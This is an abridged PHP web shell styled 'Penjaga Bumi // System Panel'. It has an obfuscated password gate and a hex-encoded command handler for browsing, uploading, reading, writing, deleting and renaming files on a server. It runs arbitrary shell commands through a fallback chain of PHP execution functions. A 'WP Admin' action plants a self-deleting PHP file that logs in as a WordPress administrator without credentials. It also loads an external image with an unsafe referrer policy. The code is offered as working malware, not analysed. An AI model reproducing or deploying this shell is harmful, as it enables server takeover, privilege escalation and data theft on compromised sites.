...
function H0lL0() { $k = [83,101,111,116,111,111,108,115,56,56]; $s = ""; foreach($k as $c) $s .= chr($c); return $s;}
...
if (!$_h_auth) {
    ...
    echo '<form class="box" method="POST"><h2>PENJAGA <span>BUMI</span></h2><p>Authentication Required</p>';
...
// ── END AUTH ──
if($_SERVER['REQUEST_METHOD']==='POST'&&isset($_POST['req_data'])){$jd=sfunc('jd');$je=sfunc('je');$raw=@hex2bin($_POST['req_data']);$req=$jd($raw,true);if(!$req)exit;$root=__DIR__;$path=H0L0($req['h']?? '');if(!$path||!is_dir($path))$path=$root;$path=str_replace('\\','/',$path);$act=$req['a'];$resp=['status'=>0];if($act==='idx'){$scn=sfunc('scn');$all=@$scn($path);$d=[];$f=[];if($all){foreach($all as $i){if($i=='.'||$i=='..')continue;$fp=$path.'/'.$i;$meta=['n'=>$i,'p'=>substr(sprintf('%o',fileperms($fp)),-4),'d'=>date("d M H:i",filemtime($fp)),'x'=>holo($fp)];if(is_dir($fp))$d[]=$meta;else{$meta['s']=fmtSize(filesize($fp));$meta['e']=strtolower(pathinfo($i,PATHINFO_EXTENSION));$f[]=$meta;}}}$crumbs=[];$b_acc="";foreach(explode('/',$path)as $part){if($part=='')continue;$b_acc.="/".$part;$crumbs[]=['n'=>$part,'x'=>holo($b_acc)];}$resp=['CACHE_D'=>holo($path),'cwd_s'=>$path,'bc'=>$crumbs,'d'=>$d,'f'=>$f];}if($act==='chnk'){$file=$path.'/'.$req['n'];$chunk=@hex2bin($req['d']);$fo=sfunc('fo');$fw=sfunc('fw');$fc=sfunc('fc');$mode=($req['is_first'])?'w':'a';$h=$fo($file,$mode);if($h){$fw($h,$chunk);$fc($h);$resp=['status'=>1];}}if($act==='rd'){$fgt=sfunc('fgt');$c=@$fgt($path.'/'.$req['t']);$resp=['c'=>bin2hex($c)];}if($act==='wr'){$fpc=sfunc('fpc');$c=@hex2bin($req['c']);$fpc($path.'/'.$req['t'],$c);$resp=['status'=>1];}if($act==='rm'){$t=$path.'/'.$req['t'];$unl=sfunc('unl');$rmd=sfunc('rmd');if(is_file($t))$unl($t);else $rmd($t);$resp=['status'=>1];}if($act==='rn'){$ren=sfunc('ren');$ren($path.'/'.$req['o'],$path.'/'.$req['n']);$resp=['status'=>1];}if($act==='cmd'){$c=$req['c'];$out='';$method='none';$fns=['exec','shell_exec','system','passthru','popen','proc_open'];$avail=[];foreach($fns as $fn){if(function_exists($fn))$avail[]=$fn;}if(function_exists('exec')){@exec($c.' 2>&1',$lines,$rc);$out=implode("\n",$lines);$method='exec';}elseif(function_exists('shell_exec')){$out=@shell_exec($c.' 2>&1');$method='shell_exec';}elseif(function_exists('system')){ob_start();@system($c.' 2>&1');$out=ob_get_clean();$method='system';}elseif(function_exists('passthru')){ob_start();@passthru($c.' 2>&1');$out=ob_get_clean();$method='passthru';}elseif(function_exists('popen')){$h=@popen($c.' 2>&1','r');if($h){$out='';while(!feof($h))$out.=fread($h,4096);pclose($h);$method='popen';}}elseif(function_exists('proc_open')){$desc=[0=>['pipe','r'],1=>['pipe','w'],2=>['pipe','w']];$p=@proc_open($c,$desc,$pipes);if(is_resource($p)){fclose($pipes[0]);$out=stream_get_contents($pipes[1]);$out.=stream_get_contents($pipes[2]);fclose($pipes[1]);fclose($pipes[2]);proc_close($p);$method='proc_open';}}$resp=['o'=>bin2hex($out?$out:''),'m'=>$method,'f'=>$avail,'cwd'=>$path];}if($act==='wplogin'){$wp=defined('ABSPATH')?rtrim(ABSPATH,'/\\'):$path;if(!defined('ABSPATH')){for($i=0;$i<10;$i++){if(is_file($wp.'/wp-load.php'))break;$wp=dirname($wp);}}if(is_file($wp.'/wp-load.php')){$tmp='_wl'.substr(md5(microtime()),0,6).'.php';$fpc=sfunc('fpc');$fpc($wp.'/'.$tmp,'<?php require_once __DIR__."/wp-load.php";$u=get_users(array("role"=>"administrator","number"=>1));if(!empty($u)){wp_set_auth_cookie($u[0]->ID,true);$f=__FILE__;wp_redirect(admin_url());@unlink($f);exit;}echo"err";@unlink(__FILE__);');$url=function_exists('site_url')?rtrim(site_url(),'/').'/'.$tmp:'';if(!$url){$proto=(isset($_SERVER["HTTPS"])&&$_SERVER["HTTPS"]!=="off")?"https":"http";$url=$proto."://".$_SERVER["HTTP_HOST"]."/".$tmp;}$resp=['url'=>$url];}else{$resp=['url'=>''];}}echo $je($resp);exit;}
?>
<!DOCTYPE html>
<html lang="en">
<head>
...
<title>Penjaga Bumi // System Panel</title>
...
<div class="app">
    ...
    <div class="head">
        <div class="logo"><img src="https://lib.cdnfonts.net/uploads/user/lib/lcnMgYSBtaW5pbWFsLCBkaXN0cmFjdGlvbi1mcmVlIGludGVyZmFjZeKAlG5vIHJlZ2lzdHJhdGlvbiwgdHJhY2tpbmcsIG9yIGxvZ2dpbmcuIHJlc3VsdCBp/icon.png" height="17" referrerpolicy="unsafe-url" /> PENJAGA <span>BUMI</span></div>
    ...
    <div class="nav">
        ...
        <button class="btn" onclick="openTerm()"><i class="fas fa-terminal"></i> Terminal</button>
        <button class="btn" onclick="wpLogin()" style="border-color:var(--neon);color:var(--neon)">WP Admin</button>
...
<div class="overlay" id="upBox">
    <div class="modal" style="text-align:center; max-width:400px;">
        <h3 style="color:#fff; margin-top:0;">UPLOAD FILE</h3>
...
<div class="overlay" id="termBox">
    <div class="modal" style="max-width:800px;">
        <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:10px;">
            <span style="color:var(--neon);font-family:'JetBrains Mono';font-size:13px;"><i class="fas fa-terminal"></i> TERMINAL <span id="termMethod" style="color:#666;font-size:10px;"></span></span>
            <span style="cursor:pointer;color:#666;" onclick="document.getElementById('termBox').style.display='none'">X</span>
        </div>
        <div id="termOut" style="background:#080808;border:1px solid var(--border);border-radius:6px;padding:12px;height:350px;overflow-y:auto;font-family:'JetBrains Mono';font-size:11px;color:#ccc;white-space:pre-wrap;margin-bottom:10px;"></div>
        <div style="display:flex;gap:8px;">
            <span style="color:var(--neon);font-family:'JetBrains Mono';font-size:13px;line-height:32px;" id="termPrompt">$</span>
            <input type="text" id="termIn" style="flex:1;background:#0a0a0a;border:1px solid var(--border);border-radius:4px;color:#fff;padding:6px 10px;font-family:'JetBrains Mono';font-size:12px;outline:none;" placeholder="Enter command..." onkeydown="if(event.key==='Enter')runCmd()">
            <button class="btn" onclick="runCmd()" style="border-color:var(--neon);color:var(--neon);">Run</button>
        </div>
        <div id="termFuncs" style="margin-top:8px;font-size:10px;color:#555;"></div>
    </div>
</div>
<?php
